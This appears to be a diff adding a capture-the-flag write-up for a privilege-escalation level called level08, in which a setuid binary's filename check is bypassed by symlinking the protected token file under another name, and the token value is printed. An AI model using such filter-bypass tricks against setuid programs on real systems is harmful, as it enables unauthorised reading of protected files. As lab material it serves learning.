@@ -1,0 +1,47 @@
+ll
+|
+L-> -rwsr-s---+ 1 flag08 [...] level08
+L-> -rw-------  1 flag08 [...] token
+
+ok so a new executable as flag08 and a token file wich we can't read inside ofc
+lets try the executable
+
+./level08
+|
+L-> ./level08 [file to read]
+
+ok so you need an arg
+
+./level08 token
+|
+L->  You mau not access 'token'
+
+hmm ok, let's see why we got this
+
+strings level08
+|
+L-> [...]
+L-> %s [file to read]
+L-> token
+L-> You may not access '%s'
+
+
+ok so it seems like we can't use any file containing token in the name
+let's verify this
+
+touch /tmp/token
+
+./level08 /tmp/token
+|
+L->  You mau not access 'token'
+
+ok it's this, but we can't use mv to edit the name of this file, but we can create a symbolic link with it
+
+ln -s ~/token /tmp/nekot
+
+./level08 /tmp/nekot
+|
+L-> quif5eloekouj29ke0vouxean
+
+
+but we can't connect to level09 with this, we need to execute getflag as flag08
